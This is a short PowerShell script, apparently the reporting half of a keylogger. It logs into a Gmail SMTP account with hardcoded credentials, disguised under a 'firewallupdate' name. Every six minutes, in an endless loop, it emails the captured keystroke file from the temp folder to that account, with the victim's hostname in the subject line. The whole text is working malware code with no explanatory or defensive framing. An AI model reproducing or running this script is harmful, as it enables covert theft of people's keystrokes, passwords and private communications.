$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('firewallupdate1@gmail.com', 'Molly922')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'firewallupdate1@gmail.com'
$ReportEmail.To.Add('firewallupdate1@gmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.log");$SMTPInfo.Send($ReportEmail);sleep 360}